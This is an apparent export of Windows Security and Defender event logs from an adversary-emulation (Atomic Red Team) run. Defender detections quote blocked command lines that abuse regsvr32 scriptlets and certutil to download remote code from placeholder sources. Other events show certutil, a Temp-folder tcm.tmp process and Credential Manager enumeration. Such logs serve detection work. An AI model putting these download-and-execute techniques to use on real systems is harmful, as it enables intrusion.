Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1254
	New Process Name:	C:\Windows\System32\sdbinst.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x4bc
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		SYSTEM
	Account Name:		DESKTOP-P8HTU4V$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x13f8
	New Process Name:	C:\Windows\System32\consent.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x218
	Creator Process Name:	C:\Windows\System32\svchost.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4673,Sensitive Privilege Use,"A privileged service was called.

Subject:
	Security ID:		SYSTEM
	Account Name:		DESKTOP-P8HTU4V$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Service:
	Server:	NT Local Security Authority / Authentication Service
	Service Name:	LsaRegisterLogonProcess()

Process:
	Process ID:	0x284
	Process Name:	C:\Windows\System32\lsass.exe

Service Request Information:
	Privileges:		SeTcbPrivilege"
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4611,Security System Extension,"A trusted logon process has been registered with the Local Security Authority.
This logon process will be trusted to submit logon requests.

Subject:
	Security ID:		SYSTEM
	Account Name:		DESKTOP-P8HTU4V$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Process Name:		ConsentUI"
Information,15/04/2020 20:14,Microsoft-Windows-Windows Defender,1117,None,"Windows Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
 For more information please see the following:
https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Powemet.A!attk&threatid=2147725438&enterprise=0
 	Name: Trojan:Win32/Powemet.A!attk
 	ID: 2147725438
 	Severity: Severe
 	Category: Trojan
 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c REGSRV_EXE /s /u /i: GITHUB_ATOMICS_T1117 REGSRV32_SCT SCROBJ_DDL
 	Detection Origin: Unknown
 	Detection Type: Concrete
 	Detection Source: System
 	User: NT AUTHORITY\SYSTEM
 	Process Name: Unknown
 	Action: Remove
 	Action Status:  No additional actions required
 	Error Code: 0x00000000
 	Error description: The operation completed successfully. 
 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
Information,15/04/2020 20:14,Microsoft-Windows-Windows Defender,1117,None,"Windows Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
 For more information please see the following:
https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Ceprolad.B&threatid=2147733363&enterprise=0
 	Name: Trojan:Win32/Ceprolad.B
 	ID: 2147733363
 	Severity: Severe
 	Category: Trojan
 	Path: CmdLine:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe & {DATE_STUFF CERTUTIL -verifyctl -split -f GITHUB_ATOMIC_RED_TEAM Get-ChildItem | Where-Object {$_.Name -notlike ""*.txt""} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }}
 	Detection Origin: Unknown
 	Detection Type: Concrete
 	Detection Source: System
 	User: NT AUTHORITY\SYSTEM
 	Process Name: Unknown
 	Action: Remove
 	Action Status:  No additional actions required
 	Error Code: 0x00000000
 	Error description: The operation completed successfully. 
 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
Information,15/04/2020 20:14,Microsoft-Windows-Windows Defender,1117,None,"Windows Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
 For more information please see the following:
https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Ceprolad.A&threatid=2147726914&enterprise=0
 	Name: Trojan:Win32/Ceprolad.A
 	ID: 2147726914
 	Severity: Severe
 	Category: Trojan
 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c cmd /c certutil -urlcache -split -f GITHUB_ATOMIC_RED_TEAM Atomic-license.txt
 	Detection Origin: Unknown
 	Detection Type: Concrete
 	Detection Source: System
 	User: NT AUTHORITY\SYSTEM
 	Process Name: Unknown
 	Action: Remove
 	Action Status:  No additional actions required
 	Error Code: 0x00000000
 	Error description: The operation completed successfully. 
 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		SYSTEM
	Account Name:		DESKTOP-P8HTU4V$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Target Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Process Information:
	New Process ID:		0xae0
	New Process Name:	C:\Windows\System32\RuntimeBroker.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x2f8
	Creator Process Name:	C:\Windows\System32\svchost.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4673,Sensitive Privilege Use,"A privileged service was called.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Service:
	Server:	Security
	Service Name:	-

Process:
	Process ID:	0xae0
	Process Name:	C:\Windows\System32\RuntimeBroker.exe

Service Request Information:
	Privileges:		SeTcbPrivilege"
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4673,Sensitive Privilege Use,"A privileged service was called.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Service:
	Server:	Security
	Service Name:	-

Process:
	Process ID:	0xae0
	Process Name:	C:\Windows\System32\RuntimeBroker.exe

Service Request Information:
	Privileges:		SeTcbPrivilege"
Information,15/04/2020 20:14,SecurityCenter,15,None,Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON.
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4673,Sensitive Privilege Use,"A privileged service was called.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Service:
	Server:	Security
	Service Name:	-

Process:
	Process ID:	0x2f8
	Process Name:	C:\Windows\System32\svchost.exe

Service Request Information:
	Privileges:		SeTcbPrivilege"
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4673,Sensitive Privilege Use,"A privileged service was called.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Service:
	Server:	Security
	Service Name:	-

Process:
	Process ID:	0x2f8
	Process Name:	C:\Windows\System32\svchost.exe

Service Request Information:
	Privileges:		SeTcbPrivilege"
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		SYSTEM
	Account Name:		DESKTOP-P8HTU4V$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Target Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Process Information:
	New Process ID:		0xd9c
	New Process Name:	C:\Windows\System32\backgroundTaskHost.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Low Mandatory Level
	Creator Process ID:	0x2f8
	Creator Process Name:	C:\Windows\System32\svchost.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		SYSTEM
	Account Name:		DESKTOP-P8HTU4V$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Target Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Process Information:
	New Process ID:		0x970
	New Process Name:	C:\Windows\System32\backgroundTaskHost.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Low Mandatory Level
	Creator Process ID:	0x2f8
	Creator Process Name:	C:\Windows\System32\svchost.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4673,Sensitive Privilege Use,"A privileged service was called.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Service:
	Server:	Security
	Service Name:	-

Process:
	Process ID:	0x2f8
	Process Name:	C:\Windows\System32\svchost.exe

Service Request Information:
	Privileges:		SeTcbPrivilege"
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		SYSTEM
	Account Name:		DESKTOP-P8HTU4V$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Target Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Process Information:
	New Process ID:		0x138
	New Process Name:	C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_16005.11029.20108.0_x64__8wekyb3d8bbwe\HxTsr.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Low Mandatory Level
	Creator Process ID:	0x2f8
	Creator Process Name:	C:\Windows\System32\svchost.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		SYSTEM
	Account Name:		DESKTOP-P8HTU4V$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Target Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Process Information:
	New Process ID:		0x9e0
	New Process Name:	C:\Windows\System32\RuntimeBroker.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x2f8
	Creator Process Name:	C:\Windows\System32\svchost.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		SYSTEM
	Account Name:		DESKTOP-P8HTU4V$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Target Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Process Information:
	New Process ID:		0xc58
	New Process Name:	C:\Windows\System32\RuntimeBroker.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x2f8
	Creator Process Name:	C:\Windows\System32\svchost.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4611,Security System Extension,"A trusted logon process has been registered with the Local Security Authority.
This logon process will be trusted to submit logon requests.

Subject:
	Security ID:		SYSTEM
	Account Name:		DESKTOP-P8HTU4V$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Process Name:		ConsentUI"
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4673,Sensitive Privilege Use,"A privileged service was called.

Subject:
	Security ID:		SYSTEM
	Account Name:		DESKTOP-P8HTU4V$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Service:
	Server:	NT Local Security Authority / Authentication Service
	Service Name:	LsaRegisterLogonProcess()

Process:
	Process ID:	0x284
	Process Name:	C:\Windows\System32\lsass.exe

Service Request Information:
	Privileges:		SeTcbPrivilege"
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x11fc
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x3c4
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1308
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x3c4
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xe08
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x3c4
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x138
	New Process Name:	C:\Windows\System32\certutil.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0xe08
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x12d8
	New Process Name:	C:\Windows\System32\certutil.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0xe08
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x994
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x3c4
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x159c
	New Process Name:	C:\Users\User\AppData\Local\Temp\2\tcm.tmp
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x994
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xb70
	New Process Name:	C:\Users\User\AppData\Local\Temp\2\tcm.tmp
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x994
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x15c
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x3c4
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,5379,User Account Management,"Credential Manager credentials were read.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F
	Read Operation:		Enumerate Credentials

This event occurs when a user performs a read operation on stored credentials in Credential Manager."
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4673,Sensitive Privilege Use,"A privileged service was called.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Service:
	Server:	Security
	Service Name:	-

Process:
	Process ID:	0x970
	Process Name:	C:\Windows\System32\backgroundTaskHost.exe

Service Request Information:
	Privileges:		SeTcbPrivilege"
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xbe0
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x3c4
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
